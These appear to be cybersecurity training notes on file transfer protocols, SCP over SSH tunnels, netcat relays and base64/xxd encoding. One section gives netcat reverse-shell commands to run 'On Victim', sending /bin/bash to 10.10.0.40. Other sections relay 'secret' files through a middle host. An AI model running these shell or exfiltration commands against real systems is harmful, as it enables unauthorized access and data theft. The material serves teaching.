  ## FILE TRANSFER AND REDIRECTION

## COMMON METHODS FOR TRANSFERRING DATA
   
    -TFTP
    -FTP
    -Active
    -Passive
    -FTPS
    -SFTP
    -SCP
## TFTP (Trivial File Transfer Protocol)

    -RFC 1350 Rev2
    -UDP transport
    -Extremely small and very simple communication
    -No terminal communication
    -Insecure (no authentication or encryption)
    -No directory services
    -Used often for technologies such as BOOTP and PXE

## FTP (File Transfer Protocol)

RFC 959
  
    -Uses 2 separate TCP connections
    -Control Connection (21) / Data Connection (20*)
    -Authentication in clear-text
    -Insecure in default configuration
    -Has directory services
    -Anonymous login

## FTPS (File Transfer Protocol Secure)

    -TCP transport
    -Adds SSL/TLS encryption to FTP
    -Authentication with username/password or PKI
    -Interactive terminal access

## SFTP (Secure File Transfer Protocol)

    -TCP transport (port 22)
    -Uses symmetric and asymmetric encryption
    -Adds FTP like services to SSH
    -Authentication through sign in (username and password) or with SSH key
    -Interactive terminal access 

## SCP (Secure Copy Protocol)

    -TCP Transport (port 22)
    -Uses symmetric and asymmetric encryption
    -Authentication through sign in (username and password) or with SSH key
    -Non-Interactive


## SCP SYNTAX

Download a file from a remote directory to a local directory
    
    $ scp student@172.16.82.106:secretstuff.txt /home/student
Upload a file to a remote directory from a local directory
    
    $ scp secretstuff.txt student@172.16.82.106:/home/student
Copy a file from a remote host to a separate remote host
    
    $ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
    
##  SCP SYNTAX W/ ALTERNATE SSHD
Download a file from a remote directory to a local directory
    
    $ scp -P 1111 student@172.16.82.106:secretstuff.txt .
Upload a file to a remote directory from a local directory
    
    $ scp -P 1111 secretstuff.txt student@172.16.82.106:
    
## SCP SYNTAX W/ ALTERNATE SSHD

Download a file from a remote directory to a local directory
    
    $ scp -P 1111 student@172.16.82.106:secretstuff.txt .
Upload a file to a remote directory from a local directory
    
    $ scp -P 1111 secretstuff.txt student@172.16.82.106:

## SCP SYNTAX THROUGH A TUNNEL
Create a local port forward to target device
    
    $ ssh student@172.16.82.106 -L 1111:localhost:22 -NT
Download a file from a remote directory to a local directory
    
    $ scp -P 1111 student@localhost:secretstuff.txt /home/student
Upload a file to a remote directory from a local directory
    
    $ scp -P 1111 secretstuff.txt student@localhost:/home/student
## SCP SYNTAX THROUGH A DYNAMIC PORT FORWARD

Create a Dynamic Port Forward to target device
    
    $ ssh student@172.16.82.106 -D 9050 -NT
Download a file from a remote directory to a local directory
    
    $ proxychains scp student@localhost:secretstuff.txt .
Upload a file to a remote directory from a local directory
    
    $ proxychains scp secretstuff.txt student@localhost:
    
## NETCAT: CLIENT TO LISTENER FILE TRANSFER
Listener (receive file):

    nc -lvp 9001 > newfile.txt
Client (sends file):

    nc 172.16.82.106 9001 < file.txt
##    NETCAT: LISTENER TO CLIENT FILE TRANSFER
Listener (sends file):

    nc -lvp 9001 < file.txt
Client (receive file):

    nc 172.16.82.106 9001 > newfile.txt

## NETCAT RELAY DEMOS
Listener - Listener


      (host 1) On Internet_Host (send):

              $ nc 172.16.82.106 1111 < secret.txt

              (this ip is from eth1 from middle man )
      
      (middle man ) On Blue_Host-1 Relay:
  
              $ mknod mypipe p
              $ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe

       (Host 2) On Blue_Priv_Host-1 (receive):
        
               $ nc 192.168.1.1 3333 > newsecret.txt

               (this ips is eth0 of middle man )
Client - Client

       (host 1) On Internet_Host (send):

                $ nc -lvp 1111 < secret.txt
        
         (middle man) On Blue_Host-1 Relay:

                $ mknod mypipe p
                $ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

                      (the 2 ips are host 1 and host 2 ips)
            
        (host 2) On Blue_Priv_Host-1 (receive):

                $ nc -lvp 3333 > newsecret.txt
        
       
 ## REVERSE SHELL USING NETCAT
First listen for the shell on your device.

    $ nc -lvp 9999

      On Victim using -c :

    $ nc -c /bin/bash 10.10.0.40 9999
    
      On Victim using -e :

    $ nc -e /bin/bash 10.10.0.40 9999     
    
## XXD EXAMPLE
echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\

    $ echo "Hex encoding test" | xxd -p
    48657820656e636f64696e6720746573740a

echo hex string and use xxd to restore the data to its original format

    $ echo "48657820656e636f64696e6720746573740a" | xxd -r -p
    Hex encoding test 

## TRANSFER FILE WITH BASE64
generate the base64 output of a file, with line wrapping removed

    $ base64 -w0 logoCyber.png

copy the output

## TRANSFER FILE WITH BASE64
create a new file on your machine

    $ nano b64image.png

    paste, save & exit

decode from base64 with -d

    $ base64 -d b64image.png > logoCyber.png
    
